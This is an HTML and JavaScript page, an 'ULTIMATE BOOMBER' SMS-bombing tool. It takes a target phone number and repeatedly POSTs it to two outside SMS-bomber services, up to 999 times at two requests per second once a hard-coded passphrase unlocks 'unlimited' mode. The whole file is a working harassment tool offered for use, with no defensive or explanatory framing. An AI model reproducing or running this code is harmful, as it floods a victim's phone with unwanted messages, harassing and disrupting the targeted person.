<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ULTIMATE BOOMBER</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body { background-color: black; color: #ff0000; font-family: 'Courier New', Courier, monospace; }
        .glitch-text {
            text-shadow: 0.05em 0 0 #00fffc, -0.03em -0.04em 0 #fc00ff, 0.025em 0.04em 0 #ffcb00;
            animation: glitch 725ms infinite;
        }
        @keyframes glitch {
            0% { text-shadow: 0.05em 0 0 #00fffc, -0.03em -0.04em 0 #fc00ff, 0.025em 0.04em 0 #ffcb00; }
            100% { text-shadow: -0.05em -0.025em 0 #00fffc, 0.025em 0.035em 0 #fc00ff, -0.05em -0.05em 0 #ffcb00; }
        }
        .glass-card {
            background: rgba(20, 20, 20, 0.9);
            border: 1px solid #ff0000;
            box-shadow: 0 0 20px rgba(255, 0, 0, 0.3);
        }
    </style>
</head>
<body class="flex flex-col items-center justify-center min-h-screen p-4">

    <h1 class="text-4xl font-bold mb-8 glitch-text text-center uppercase">ULTIMATE BOOMBER</h1>

    <div class="glass-card p-6 rounded-xl w-full max-w-md">
        <label class="block mb-2 text-sm">Target Number:</label>
        <input type="text" id="targetNumber" placeholder="+8801xxxxxxxxx" class="w-full p-2 mb-4 bg-black border border-red-900 text-white rounded focus:outline-none">

        <div id="normalMode">
            <label class="block mb-2 text-sm">SMS Amount (Max 100):</label>
            <input type="number" id="amount" max="100" value="10" class="w-full p-2 mb-4 bg-black border border-red-900 text-white rounded">
            <p class="text-[10px] text-gray-500 mb-2 italic">ENTER ultimate pass for unlimited sms attempt</p>
            <input type="password" id="passKey" placeholder="Enter Pass" class="w-full p-2 mb-4 bg-black border border-red-900 text-white rounded text-sm">
        </div>

        <div id="unlimitedMode" class="hidden">
            <p class="text-green-500 font-bold text-sm mb-2">ULTIMATE MODE ACTIVE (2 SMS/sec)</p>
            <p class="text-xs text-gray-400 mb-4">24H Session Active</p>
        </div>

        <button id="attackBtn" class="w-full py-3 bg-red-600 hover:bg-red-700 text-white font-bold rounded transition-all mb-4">ATTACK</button>
        <button id="stopBtn" class="w-full py-3 bg-zinc-800 text-white font-bold rounded hidden mb-4">STOP BOOMING</button>

        <div class="text-center mt-4">
            <p class="text-xs text-gray-400">Status: <span id="status" class="text-white">Ready</span></p>
        </div>
    </div>

    <script>
        const ULTIMATE_PASS = "PROVIDER_1_KEY";
        let isAttacking = false;

        const attackBtn = document.getElementById('attackBtn');
        const stopBtn = document.getElementById('stopBtn');
        const statusText = document.getElementById('status');
        const passInput = document.getElementById('passKey');

        // Pass Check Logic
        passInput.addEventListener('input', (e) => {
            if(e.target.value === ULTIMATE_PASS) {
                document.getElementById('normalMode').classList.add('hidden');
                document.getElementById('unlimitedMode').classList.remove('hidden');
            }
        });

        async function startAttack() {
            const number = document.getElementById('targetNumber').value;
            const amount = parseInt(document.getElementById('amount').value);
            const isUnlimited = !document.getElementById('unlimitedMode').classList.contains('hidden');

            if(!number) return alert("Enter Number!");

            isAttacking = true;
            attackBtn.classList.add('hidden');
            stopBtn.classList.remove('hidden');
            statusText.innerText = "Attacking...";

            let limit = isUnlimited ? 999 : amount;
            let speed = isUnlimited ? 500 : 1000;

            for(let i=0; i < limit; i++) {
                if(!isAttacking) break;

                const apis = ['https://shadowx-sms-bomber.onrender.com/', 'https://nuke-sms-bomber.pages.dev/'];
                apis.forEach(api => {
                    fetch(api, {
                        method: 'POST',
                        mode: 'no-cors',
                        body: JSON.stringify({ number: number, count: 1 }),
                        headers: { 'Content-Type': 'application/json' }
                    }).catch(err => console.log("API Error"));
                });

                statusText.innerText = `Sending... ${isUnlimited ? '∞' : i+1}/${limit}`;
                await new Promise(res => setTimeout(res, speed));
            }
            stopAttack();
        }

        function stopAttack() {
            isAttacking = false;
            attackBtn.classList.remove('hidden');
            stopBtn.classList.add('hidden');
            statusText.innerText = "Stopped";
        }

        attackBtn.addEventListener('click', startAttack);
        stopBtn.addEventListener('click', stopAttack);
    </script>
</body>
</html>
